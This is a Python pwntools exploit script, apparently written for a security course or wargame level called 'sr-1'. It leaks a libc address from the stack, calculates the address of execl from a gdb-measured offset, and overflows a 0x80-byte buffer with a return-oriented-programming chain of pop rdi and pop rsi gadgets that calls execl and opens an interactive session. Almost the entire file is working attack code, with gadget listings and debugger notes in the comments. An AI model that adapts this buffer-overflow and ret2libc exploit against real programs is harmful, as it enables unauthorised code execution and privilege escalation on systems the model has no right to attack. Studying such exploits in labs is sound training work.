#!/usr/bin/env python

from pwn import *
import os

p = process("./sr-1")

env = {
        "PATH": "/home/users/didnera/week6/0-sr-1"
        }


#first read buffer is 0x84 bytes
#so read 0x88 bytes
p.recv()

#because gdb looked at stack, for return address of libc_main. then got offset as c0 which is 192
p.sendline("192")


#get a leaky address for calcuclating setregid offset
#output = p.recv()
#print("OUTPUT: " + repr(output))


i = 0
intvalue = 0
for i in range(0,24):
    intvalue = u64(p.recv(8))
    print(str(i) + ":  "+ hex(intvalue))
print("intvalue: " + hex(intvalue))

#second read is 0x80 bytes
'''
0x000000000040077c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040077e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400780 : pop r14 ; pop r15 ; ret
0x0000000000400782 : pop r15 ; ret
0x00000000004005c1 : pop rax ; adc byte ptr [rax], ah ; jmp rax
0x0000000000400632 : pop rbp ; mov byte ptr [rip + 0x200a1e], 1 ; ret
0x00000000004005bf : pop rbp ; mov edi, 0x601058 ; jmp rax
0x000000000040077b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040077f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005d0 : pop rbp ; ret
0x0000000000400783 : pop rdi ; ret
0x0000000000400781 : pop rsi ; pop r15 ; ret
0x000000000040077d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
'''

pop_rdi = p64(0x0000000000400783)
pop_rsi_r15 = p64(0x0000000000400781)

'''
pwndbg> 0x00007f9cab89a830
Undefined command: "0x00007f9cab89a830".  Try "help".
pwndbg> print execl
$2 = {<text variable, no debug info>} 0x7f9cab946a20 <__GI_execl>
'''


offset = 0x7f9cab946a20 - 0x7f9cab89a830

print("offset: " + hex(offset))
execvl = intvalue + offset
target_run = p64(0x400924)
'''
0x400924:       "d"
0x400924:
'''


#cut output into 128
buf = "A" * 0x80 + "ABCDABCD"
buf += pop_rdi
buf += target_run
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += p64(execvl)



p.sendline(buf)
p.interactive()